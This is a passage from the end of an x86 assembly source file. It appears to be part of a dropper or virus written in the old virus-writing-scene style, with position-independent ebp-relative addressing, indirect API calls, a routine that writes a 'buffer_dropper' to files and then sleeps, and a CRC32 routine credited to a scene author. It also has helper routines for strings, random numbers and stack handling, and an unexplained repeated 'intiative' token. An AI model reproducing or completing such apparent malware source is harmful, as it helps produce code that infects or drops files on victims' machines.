    push edx
    push eax
    intiative 
    call AWriteFile
    pop ebx
    intiative
    call ACloseHandle
    seek_nother:
    pop edx
    add edx,4
    cmp byte ptr [edx+1],0
    je sleep_baby
    jmp _rumble
    sleep_baby:
    push 2000
    intiative
    call ASleep
    mov esi,[ebp+offset buffer_dropper]
    mov ecx,512
    call zero_mem
    ret

;//////////////////////esi=text
;//////////////////////ecx=sizeof text
;//////////////////////returning eax=CRC32 of that text
;////////////////////Original code by Sepultura. ,re-styled by me :)
crc_:       
    xor edx,edx
    dec edx

    @0:
        lodsb
        xor dl,al
        push ecx
        push 8
        pop ecx ;silmaril note ;)
    @1:
        shr edx,1
        jnc @f
        xor edx,0EDB88320h
    @@:
        loop @1
        pop ecx
        loop @0
        not edx
        xchg edx,eax
        ret

;---------------------Some Accessory function I use
;//////////////size string esi=offset sring,ecx=the result
size_string:
    push esi
    xor ecx,ecx
    loop_size:
    cmp byte ptr [esi],0
    je sized
    inc esi
    inc ecx
    jmp loop_size

    sized:
    pop esi
    ret

rnd_:
    inc ecx
    push ecx
    mov eax,[ebp+stack_mem]
    call AGetTickCount
    add eax,1234h
    pop ecx
    @2:
    push ecx
    xor edx,edx
    div ecx
    xchg edx,eax
    pop ecx
    cmp eax,ecx
    ja @2
    cmp eax,0
    ja @w
    xchg eax,edx
    jmp @2
    @w:
    ret

return_stack:
    mov esi,[ebp+offset saved_stack]
    mov edi,[ebp+offset stack_mem]
    call save_stack 
    ret

hold_stack:
    mov edi,[ebp+offset saved_stack]
    mov esi,[ebp+offset stack_mem]
    call save_stack 
    ret


zero_mem:
    mov byte ptr [esi],0
    inc esi
    loop zero_mem
    ret

lstrct:
    search_zero:
    cmp byte ptr [edi],0
    je found_zero
    inc edi
    jmp search_zero
    found_zero:
    rep movsb
    ret
 
end__:
end start          ;end of story!